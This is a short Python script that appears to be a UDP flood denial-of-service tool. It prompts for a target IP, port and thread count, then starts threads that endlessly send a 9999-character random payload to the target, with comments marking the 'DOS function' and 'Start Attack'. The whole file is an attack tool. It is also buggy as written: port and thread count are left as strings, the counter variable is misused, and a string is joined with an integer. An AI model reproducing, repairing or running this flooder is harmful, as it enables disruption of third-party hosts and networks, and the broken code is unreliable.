import socket
import random
import string
from threading import Thread

UDP_IP = input("TARGET IP:")
UDP_PORT = input("TARGET PORT:")
Thears = input("Theards:")

message = ""
msgcol = 0
chars = string.ascii_letters + string.digits

#Generation pocket
password =''
for i in range(9999):
    password += random.choice(chars)

#Preparing to send
message = message + password
message = message.encode()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

def bye(): # DOS function
    while True:
        sock.sendto(message, (UDP_IP, UDP_PORT))
        msgcol = msgcol + 1 
        print ("1 message send total:" + msgcol)

for i in range(Thears): #Start Attack
    th = Thread(target=bye)
    th.start()
